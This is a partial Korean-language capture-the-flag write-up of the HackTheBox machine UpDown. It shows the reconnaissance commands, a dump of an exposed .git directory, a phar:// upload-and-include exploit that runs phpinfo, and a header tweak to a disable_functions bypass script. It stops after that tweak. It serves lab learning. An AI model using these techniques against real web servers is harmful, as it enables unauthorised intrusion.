---
layout: post
title: HackTheBox UpDown
subtitle: UpDown WriteUp
author: g3rm
categories: HTB
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - HTB
  - WriteUp
  - Linux
sidebar:
---


## Summary
![](assets/images/posts/2025-03-17-UpDown/1a290611f444e0d251233ed971a4f9f7_MD5.jpeg)
## Target - 10.129.227.227
### Nmap
```bash
nmap -sC -sV -Pn -p- 10.129.227.227 -o UpDown_AllPort
```

### WEB
```bash
# 호스트 등록
echo "10.129.227.227 siteisup.htb" | sudo tee -a /etc/hosts

# 디렉토리 탐색
gobuster dir -u siteisup.htb -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://siteisup.htb/dev -w /usr/share/wordlists/dirb/common.txt

# 서브도메인 탐색
gobuster vhost -u http://siteisup.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain

# 서브도메인 호스트 등록
echo "10.129.227.227 dev.siteisup.htb" | sudo tee -a /etc/hosts

# git dump
git-dumper http://siteisup.htb/dev/.git dev

# config 보기
cat .htaccess
```

![](/assets/images/posts/2025-03-17-UpDown/284ba3fd6ad877528a4f3670a2f6ce5b_MD5.jpeg)
![](/assets/images/posts/2025-03-17-UpDown/3dad85a3644415a5b33e41cbffc9aec7_MD5.jpeg)

![](/assets/images/posts/2025-03-17-UpDown/a41302bb81f42bed44f2386fe38e06c2_MD5.jpeg)
![](/assets/images/posts/2025-03-17-UpDown/caba1c0c482717b28220a2be17b2c742_MD5.jpeg)

![](/assets/images/posts/2025-03-17-UpDown/fb818fef54497e9853afd3ea110a3218_MD5.jpeg)![](/assets/images/posts/2025-03-17-UpDown/3081fbcce96767472ac559c5c7d2bcd1_MD5.jpeg)

### phar:// Exploit
```bash
# 파일 필터링 로직 및 upload 경로 확인
cat checker.php

echo "<?php phpinfo(); ?>" > info.php
zip info.zip info.php
mv info.zip info.txt

http://dev.siteisup.htb/?page=phar://uploads/81a43c47153e43e72ed9cffff50520f9/info.txt/info
```


### dfunc-bypasser.py
```bash
# vi dfunc-bypasser.py 수정
phpinfo = requests.get(url, headers={"Special-dev":"only4dev"}).text

# 
```
![](assets/images/posts/2025-03-17-UpDown/a031fa0acd34384e5287aa7bf3cf36fd_MD5.jpeg)